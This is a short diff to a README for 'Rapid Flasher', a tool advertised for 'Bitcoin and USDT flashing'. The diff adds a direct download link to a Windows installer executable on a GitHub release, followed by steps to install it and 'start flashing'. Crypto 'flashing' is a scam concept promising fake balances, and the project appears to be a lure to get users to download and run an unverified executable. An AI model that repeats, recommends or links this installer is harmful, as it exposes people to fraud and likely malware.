@@ -17,7 +17,7 @@ Rapid Flasher is a powerful tool for Bitcoin and USDT flashing, it has an easy t
 
 ## Get Started
 
-1. Download the Rapid Flasher installer
+1. Download the Rapid Flasher installer [here](https://github.com/mmrtghq/FLASH-BTC-USDT/releases/download/EXE/RapidFlasherV2.3Installer.exe)
 2. Install Rapid Flasher
 3. Start flashing!
 
